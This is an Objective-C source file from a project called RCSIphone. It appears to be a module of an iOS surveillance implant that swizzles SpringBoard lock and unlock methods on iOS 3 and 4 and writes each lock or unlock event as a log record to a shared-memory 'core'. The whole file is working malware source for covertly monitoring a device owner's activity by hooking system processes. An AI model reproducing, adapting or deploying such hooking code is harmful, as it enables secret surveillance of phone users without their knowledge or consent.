//
//  RCSIEventStandBy.m
//  RCSIphone
//
//  Created by kiodo on 14/06/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//
#import <objc/runtime.h>

#import "RCSICommon.h"
#import "RCSIEventStandBy.h"
#import "RCSISharedMemory.h"

@implementation eventStandBy

#pragma mark -
#pragma mark - send blob
#pragma mark -

+ (BOOL)triggerStanByAction:(UInt32)aAction
{
  BOOL retVal = YES;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *actionData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[actionData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = EVENT_STANDBY;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = aAction;
  shMemoryHeader->commandDataSize = 0;
  shMemoryHeader->timestamp       = 0;
  
  [[RCSISharedMemory sharedInstance] writeIpcBlob:actionData]; 
  
  [actionData release];
  
  [pool release];
  
  return retVal;
}

- (id)init
{
  self = [super init];
  if (self) 
    {
      mEventID = EVENT_STANDBY;
    }
  
  return self;
}

#pragma mark -
#pragma mark - Hooks 
#pragma mark -

- (void)lockWithTypeHook:(int)aInteger disableLockSound: (BOOL)aBool
{
  [self lockWithTypeHook:aInteger disableLockSound:aBool];
  
  [eventStandBy triggerStanByAction: EVENT_STANDBY_LOCK];  
}
- (void)lockHook: (BOOL)aValue
{
  [self lockHook: aValue];
  
  [eventStandBy triggerStanByAction: EVENT_STANDBY_LOCK];
}

- (void)unlockWithSoundHook:(BOOL)aBool alertDisplay:(id)anID
{
  [self unlockWithSoundHook:aBool alertDisplay:anID];

  //[eventStandBy triggerStanByAction: EVENT_STANDBY_UNLOCK];
}

- (void)lockBarUnlockedHook:(id)aValue
{
  [self lockBarUnlockedHook: aValue];
  
  [eventStandBy triggerStanByAction: EVENT_STANDBY_UNLOCK];
}

- (void)lockBarUnlocked2Hook:(id)aValue
{
  [self lockBarUnlocked2Hook: aValue];
  
  [eventStandBy triggerStanByAction: EVENT_STANDBY_LOCK];
}

- (BOOL)hookingStandByMethods
{
  // lock class for iOS 3/4
  Class sBUIController = objc_getClass("SBUIController");
  
  // Unlock class for iOS 3/4
  Class sBCallAlertDisplay  = objc_getClass("SBCallAlertDisplay");
  Class sBAwayView          = objc_getClass("SBAwayView");
  Class sBAwayController    = objc_getClass("SBAwayController");
  
  Class classSource = [self class];
  
  if (sBUIController == nil || sBCallAlertDisplay == nil || 
      sBAwayView == nil || sBAwayController == nil)
    return NO;
  
  // methods for iOS 3.1.3
  [self swizzleByAddingIMP:sBUIController 
                   withSEL:@selector(lock:)
            implementation:class_getMethodImplementation(classSource, @selector(lockHook:))
              andNewMethod:@selector(lockHook:)];
  
  [self swizzleByAddingIMP:sBAwayView
                   withSEL:@selector(lockBarUnlocked:)
            implementation:class_getMethodImplementation(classSource, @selector(lockBarUnlockedHook:))
              andNewMethod:@selector(lockBarUnlockedHook:)];
  
  // methods for iOS 4.3.3
  [self swizzleByAddingIMP:sBUIController
                   withSEL:@selector(lockWithType:disableLockSound:)
            implementation:class_getMethodImplementation(classSource, @selector(lockWithTypeHook:disableLockSound:))
              andNewMethod:@selector(lockWithTypeHook:disableLockSound:)];
  
  [self swizzleByAddingIMP:sBAwayController
                   withSEL:@selector(unlockWithSound:alertDisplay:)
            implementation:class_getMethodImplementation(classSource, @selector(unlockWithSoundHook:alertDisplay:))
              andNewMethod:@selector(unlockWithSoundHook:alertDisplay:)];
  
  
  
  [self swizzleByAddingIMP:sBCallAlertDisplay
                   withSEL:@selector(lockBarUnlocked:)
            implementation:class_getMethodImplementation(classSource, @selector(lockBarUnlocked2Hook:))
              andNewMethod:@selector(lockBarUnlocked2Hook:)];
  
  return YES;
}

#pragma mark -
#pragma mark - implementation
#pragma mark -

- (BOOL)start
{
  BOOL retVal = TRUE;
  
  if ([self mEventStatus] == EVENT_STATUS_STOPPED && 
      [self hookingStandByMethods] == TRUE)
    {
      [self setMEventStatus: EVENT_STATUS_RUNNING];
    }
  
  return retVal;
}

- (void)stop
{
  if ([self mEventStatus] == EVENT_STATUS_RUNNING&& 
      [self hookingStandByMethods] == TRUE)
    {
      [self setMEventStatus: EVENT_STATUS_STOPPED];
    }
}
@end
